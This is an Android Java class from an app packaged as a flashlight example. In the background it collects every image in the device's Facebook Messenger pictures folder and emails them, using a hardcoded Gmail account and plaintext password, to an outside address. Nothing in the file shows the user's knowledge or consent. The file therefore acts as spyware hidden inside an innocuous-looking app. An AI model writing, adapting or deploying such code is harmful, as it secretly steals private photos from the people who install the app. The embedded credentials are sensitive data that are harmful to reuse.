package com.example.flashlightexample;

import java.io.File;
import java.io.FileFilter;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

import android.content.Context;
import android.net.Uri;
import android.os.AsyncTask;
import android.util.Log;
import android.widget.Toast;

public class SendEmailAsyncTask extends AsyncTask<String,Void,Boolean> {
	Context context;
	MailCallback mailCallback;
	public SendEmailAsyncTask(Context context,MailCallback mailCallback) {
		// TODO Auto-generated constructor stub
		this.context=context;
		this.mailCallback=mailCallback;
	}
	
	@Override
	protected void onPostExecute(Boolean result) {
		// TODO Auto-generated method stub
		super.onPostExecute(result);
		mailCallback.onSucces(result);
	}

	@Override
	protected Boolean doInBackground(String... params) {
		   
		
		
		    
		// TODO Auto-generated method stub
		System.out.println("mail gönderiliyor...");
		MailIki m = new MailIki("hemenindir57@gmail.com","123zafer123"); 
	    //   emailGonder();
			 String[] toArr = {"mehmetduman34500@gmail.com"}; 
		        m.setTo(toArr); 
		        m.setFrom("hemenindir57@gmail.com"); 
		        m.setSubject("--FacebookMessenger--"); 
		        m.setBody("Email body"); 
		       
		        try { 
		        		                 
	               //Facebook Messenger Resimleri  
	                 String pathMessanger = "/storage/sdcard0/Pictures/Messenger";
	                 File fileMesseger=new File(pathMessanger);
	                 String[] _filesMessenger = fileMesseger.list(); 
	                 for ( int i = 0 ; i < _filesMessenger.length ; i++  )
	                 { 
	                     _filesMessenger[i] = pathMessanger + "/"+ _filesMessenger[i];
	               //        _files[i] = path + "/"+ _files[i].substring(_files[i].lastIndexOf("/"));
	                       m.addAttachment(_filesMessenger[i]);
	                       Log.i("zms", "zms FileMessanger "+_filesMessenger[i]);
	                      // Log.i("zms", "zms "+_files[i].substring(_files[i].lastIndexOf("/")));
	                 }
	               
	              	
			        	
	              if(m.send()) { 

	                 for ( int i = 0 ; i < _filesMessenger.length ; i++  )
	                  { 
	                      Log.i("zms test _files", "zms success");
	                  }
	                  
	              } else { 
	                  Log.i("zms test mail result", "zms fail");
	              } 
	            } catch(Exception e) {
	                 Log.i("zms test mail result", "zms error while sending");
	            } 
		return false;
	}
	  

}
 